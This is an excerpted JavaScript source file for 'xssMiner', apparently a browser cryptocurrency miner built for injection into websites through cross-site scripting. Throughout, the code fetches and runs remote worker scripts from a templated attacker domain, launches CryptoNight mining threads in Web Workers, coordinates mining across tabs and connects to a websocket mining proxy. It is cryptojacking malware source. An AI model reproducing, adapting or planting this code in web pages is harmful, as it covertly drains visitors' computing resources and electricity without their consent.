(function (window) {
    ...
    var Miner = function (siteKey, params) {
        ...
        this._tab = {
            ...
            mode: xssMiner.IF_EXCLUSIVE_TAB,
            grace: 0,
            lastPingReceived: 0,
            interval: null
        };
        if (window.BroadcastChannel) {
            try {
                this._bc = new BroadcastChannel("xssMiner");
    ...
    Miner.prototype.start = function (mode) {
        this._tab.mode = mode || xssMiner.IF_EXCLUSIVE_TAB;
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener("load", function () {
                xssMiner.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", "http://%xssMiner_domain%/worker.js", true);
            xhr.send()
            ...
            xhr.open("get", xssMiner.CONFIG.LIB_URL + "cryptonight-asmjs.min.js", true);
            xhr.send()
        }
    };
    ...
    Miner.prototype.setNumThreads = function (num) {
        ...
        if (num > this._threads.length) {
            for (var i = 0; num > this._threads.length; i++) {
                var thread = new xssMiner.JobThread;
                if (this._currentJob) {
    ...
    Miner.prototype._startNow = function () {
        if (this._tab.mode !== xssMiner.FORCE_MULTI_TAB && !this._tab.interval) {
            this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
        }
        if (this._tab.mode === xssMiner.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return
        }
        if (this._tab.mode === xssMiner.FORCE_EXCLUSIVE_TAB) {
            this._tab.grace = Date.now() + 3e3
        }
        if (!this.verifyThread) {
            this.verifyThread = new xssMiner.JobThread
        }
        this.setNumThreads(this._targetNumThreads);
        this._autoReconnect = true;
        if (xssMiner.CONFIG.REQUIRES_AUTH) {
            this._auth = this._auth || new xssMiner.Auth(this._siteKey);
    ...
    Miner.prototype._otherTabRunning = function () {
        ...
        try {
            var tdjson = localStorage.getItem("xssMiner");
            if (tdjson) {
    ...
    Miner.prototype._updateTabs = function () {
        ...
        if (this.isRunning()) {
            ...
            try {
                localStorage.setItem("xssMiner", JSON.stringify({
    ...
    Miner.prototype._connect = function () {
        ...
        var shards = xssMiner.CONFIG.WEBSOCKET_SHARDS;
    ...
    Miner.prototype._onMessage = function (ev) {
        ...
        if (msg.type === "job") {
            ...
            if (console && console.error) {
                console.error("xssMiner Error:", msg.params.error)
            }
    ...
    window.xssMiner = window.xssMiner || {};
    window.xssMiner.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    window.xssMiner.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    window.xssMiner.FORCE_MULTI_TAB = "forceMultiTab";
    window.xssMiner.Token = function (siteKey, goal, params) {
        var miner = new Miner(siteKey, params);
        miner._goal = goal || 0;
        return miner
    };
    window.xssMiner.User = function (siteKey, user, params) {
        var miner = new Miner(siteKey, params);
        miner._user = user;
        return miner
    };
    window.xssMiner.Anonymous = function (siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner
    }
})(window);
(function (window) {
    ...
    var JobThread = function () {
        this.worker = new Worker(xssMiner.CRYPTONIGHT_WORKER_BLOB);
    ...
    window.xssMiner.JobThread = JobThread
})(window);
self.xssMiner = self.xssMiner || {};
self.xssMiner.CONFIG = {
    LIB_URL: "http://%xssMiner_domain%/lib/",
    WEBSOCKET_SHARDS: [["ws://%xssMiner_domain%/proxy"]],
    CAPTCHA_URL: "http://%xssMiner_domain%/captcha/",
    MINER_URL: "http://%xssMiner_domain%/media/miner.html"
};
